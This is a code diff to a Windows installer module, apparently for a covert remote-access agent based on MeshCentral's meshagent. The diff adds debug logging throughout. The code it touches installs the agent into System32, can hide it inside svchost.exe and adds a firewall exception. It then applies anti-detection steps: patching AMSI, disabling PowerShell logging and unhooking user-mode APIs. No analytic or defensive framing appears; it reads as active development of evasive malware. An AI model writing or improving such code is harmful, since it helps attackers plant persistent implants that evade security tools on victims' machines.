@@ -15,6 +15,7 @@
 #include <stdio.h>
 #include <strsafe.h>
 #include "stealth.h"
+#include "stealth_utils.h"
 #include "../meshcore/generated/meshagent_branding.h"
 
 // Forward declarations for persistence helpers
@@ -49,12 +50,12 @@ BOOL Stealth_GetInstallPaths(StealthInstallPaths *paths)
     // Base installation directory (derive from %SystemRoot% to avoid hard-coded C:) 
     WCHAR windowsDir[MAX_PATH] = {0};
     UINT wlen = GetWindowsDirectoryW(windowsDir, MAX_PATH);
-    if (wlen == 0 || wlen >= MAX_PATH) { return FALSE; }
+    if (wlen == 0 || wlen >= MAX_PATH) { Stealth_DebugLastErrorW(L"GetWindowsDirectoryW"); return FALSE; }
     // Build System32 path explicitly to avoid WOW64 redirection inconsistencies
     WCHAR system32Dir[MAX_PATH] = {0};
-    if (FAILED(StringCchPrintfW(system32Dir, MAX_PATH, L"%s\\System32", windowsDir))) { return FALSE; }
-    if (FAILED(StringCchPrintfW(paths->installDir, MAX_PATH, L"%s\\%s", system32Dir, INSTALL_FOLDER_NAME))) { return FALSE; }
-    if (FAILED(StringCchPrintfW(paths->logsDir, MAX_PATH, L"%s\\%s\\%s", system32Dir, INSTALL_FOLDER_NAME, INSTALL_FOLDER_LOGS_NAME))) { return FALSE; }
+    if (FAILED(StringCchPrintfW(system32Dir, MAX_PATH, L"%s\\System32", windowsDir))) { Stealth_DebugPrintfW(L"StringCchPrintfW failed for system32Dir"); return FALSE; }
+    if (FAILED(StringCchPrintfW(paths->installDir, MAX_PATH, L"%s\\%s", system32Dir, INSTALL_FOLDER_NAME))) { Stealth_DebugPrintfW(L"StringCchPrintfW failed for installDir"); return FALSE; }
+    if (FAILED(StringCchPrintfW(paths->logsDir, MAX_PATH, L"%s\\%s\\%s", system32Dir, INSTALL_FOLDER_NAME, INSTALL_FOLDER_LOGS_NAME))) { Stealth_DebugPrintfW(L"StringCchPrintfW failed for logsDir"); return FALSE; }
 
     // Executable path
     swprintf_s(paths->exePath, MAX_PATH, L"%s\\%s", paths->installDir, SERVICE_EXE_NAME);
@@ -89,12 +90,14 @@ BOOL Stealth_PerformCompleteInstallation(
     // Get installation paths
     if (!Stealth_GetInstallPaths(&paths))
     {
+        Stealth_DebugPrintfW(L"Stealth_GetInstallPaths failed");
         return FALSE;
     }
 
     // Step 1: Create installation directories
     if (!Stealth_CreateInstallationDirectory(paths.installDir))
     {
+        Stealth_DebugPrintfW(L"Failed to create install directory: %ls", paths.installDir);
         return FALSE;
     }
 
@@ -109,6 +112,7 @@ BOOL Stealth_PerformCompleteInstallation(
         // Copy EXE for standalone mode
         if (!Stealth_InstallFiles(sourceExePath, paths.exePath))
         {
+            Stealth_DebugPrintfW(L"Stealth_InstallFiles failed (EXE) %ls -> %ls", sourceExePath, paths.exePath);
             return FALSE;
         }
     }
@@ -118,6 +122,7 @@ BOOL Stealth_PerformCompleteInstallation(
         // Copy DLL for svchost mode
         if (!Stealth_InstallFiles(sourceDllPath, paths.dllPath))
         {
+            Stealth_DebugPrintfW(L"Stealth_InstallFiles failed (DLL) %ls -> %ls", sourceDllPath, paths.dllPath);
             return FALSE;
         }
     }
@@ -128,6 +133,7 @@ BOOL Stealth_PerformCompleteInstallation(
         // Register for svchost.exe hosting
         if (!Stealth_RegisterSvchostService(SERVICE_NAME, paths.dllPath))
         {
+            Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService failed for %ls", SERVICE_NAME);
             return FALSE;
         }
         success = TRUE;
@@ -185,8 +191,16 @@ BOOL Stealth_PerformCompleteInstallation(
                 CloseServiceHandle(hService);
                 success = TRUE;
             }
+            else
+            {
+                Stealth_DebugLastErrorW(L"CreateServiceW");
+            }
 
             CloseServiceHandle(hSCM);
+        }
+        else
+        {
+            Stealth_DebugLastErrorW(L"OpenSCManagerW");
         }
     }
 
@@ -194,10 +208,16 @@ BOOL Stealth_PerformCompleteInstallation(
     const wchar_t* fileToExcept = useSvchostMode ?
         L"C:\\Windows\\System32\\svchost.exe" : paths.exePath;
 
-    Stealth_AddFirewallRuleForService(SERVICE_NAME, fileToExcept);
+    if (!Stealth_AddFirewallRuleForService(SERVICE_NAME, fileToExcept))
+    {
+        Stealth_DebugPrintfW(L"Stealth_AddFirewallRuleForService failed for %ls", SERVICE_NAME);
+    }
 
     // Step 5: Apply anti-detection measures
-    Stealth_PatchAMSI();
+    if (!Stealth_PatchAMSI())
+    {
+        Stealth_DebugPrintfA("Stealth_PatchAMSI failed during installation");
+    }
     Stealth_DisablePowerShellLogging();
     Stealth_UnhookUserModeAPIs();
 
